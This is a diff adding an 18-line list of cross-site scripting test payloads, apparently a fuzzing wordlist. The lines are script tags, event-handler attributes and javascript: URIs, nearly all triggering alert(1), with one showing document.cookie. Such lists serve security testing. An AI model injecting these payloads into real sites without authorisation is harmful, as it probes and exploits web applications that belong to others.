@@ -1,0 +1,18 @@
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<a href="javascript:alert(1)">click</a>
+"><script>alert(document.cookie)</script>
+<body onload=alert(1)>
+<iframe src="javascript:alert(1)"></iframe>
+<input onfocus=alert(1) autofocus>
+<select onfocus=alert(1) autofocus></select>
+<textarea onfocus=alert(1) autofocus></textarea>
+<details open ontoggle=alert(1)></details>
+<marquee onstart=alert(1)></marquee>
+javascript:alert(1)
+<img src=x onerror="alert(String.fromCharCode(88,83,83))">
+<svg><script>alert(1)</script></svg>
+'"><img src=x onerror=alert(1)>
+<div style="background:url(javascript:alert(1))">x</div>
+<object data="javascript:alert(1)"></object>
